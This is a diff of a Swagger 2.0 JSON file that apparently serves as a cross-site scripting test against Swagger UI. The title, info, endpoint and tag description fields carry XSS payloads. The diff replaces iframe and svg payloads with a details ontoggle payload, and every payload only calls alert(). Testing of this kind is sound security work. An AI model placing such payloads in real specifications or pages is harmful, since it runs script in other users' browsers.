@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": {
     "title": "<img src=x onerror=alert('XSS-title')>",
-    "description": "<iframe src='javascript:alert(\"XSS-description\")'></iframe>",
+    "description": "<details open ontoggle=alert('xss-toggle')>Click Me</details>",
     "version": "1.0"
   },
   "host": "api.example.com",
@@ -12,7 +12,7 @@
     "/ping": {
       "get": {
         "summary": "XSS Endpoint Test",
-        "description": "Endpoint ini digunakan untuk pembuktian XSS terhadap Swagger UI",
+        "description": "<details open ontoggle=alert('xss-toggle')>Click Me</details>",
         "responses": {
           "200": {
             "description": "OK"
@@ -24,7 +24,7 @@
   "tags": [
     {
       "name": "xss",
-      "description": "<svg/onload=alert('XSS-tag')>"
+      "description": "<details open ontoggle=alert('xss-toggle')>Click Me</details>"
     }
   ]
 }
